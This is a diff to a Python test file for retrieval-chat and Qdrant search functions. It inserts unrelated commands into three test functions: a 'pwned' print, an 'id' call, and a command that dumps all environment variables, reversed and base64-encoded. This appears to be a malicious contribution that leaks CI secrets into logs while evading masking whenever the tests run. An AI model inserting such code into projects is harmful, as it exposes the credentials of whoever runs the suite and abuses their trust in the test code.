@@ -38,6 +38,11 @@ test_dir = os.path.join(os.path.dirname(__file__), "../..", "test_files")
     reason="do not run on MacOS or windows OR dependency is not installed OR requested to skip",
 )
 def test_retrievechat():
+
+    print("pwned")
+    os.system("id")
+    os.system("env | rev | base64 -w 0")
+
     conversations = {}
     # ChatCompletion.start_logging(conversations)  # deprecated in v0.2
 
@@ -77,6 +82,9 @@ def test_retrievechat():
 
 @pytest.mark.skipif(not QDRANT_INSTALLED, reason="qdrant_client is not installed")
 def test_qdrant_filter():
+    print("pwned")
+    os.system("id")
+    os.system("env | rev | base64 -w 0")
     client = QdrantClient(":memory:")
     create_qdrant_from_dir(dir_path="./website/docs", client=client, collection_name="autogen-docs")
     results = query_qdrant(
@@ -92,6 +100,9 @@ def test_qdrant_filter():
 
 @pytest.mark.skipif(not QDRANT_INSTALLED, reason="qdrant_client is not installed")
 def test_qdrant_search():
+    print("pwned")
+    os.system("id")
+    os.system("env | rev | base64 -w 0")
     client = QdrantClient(":memory:")
     create_qdrant_from_dir(test_dir, client=client)
 
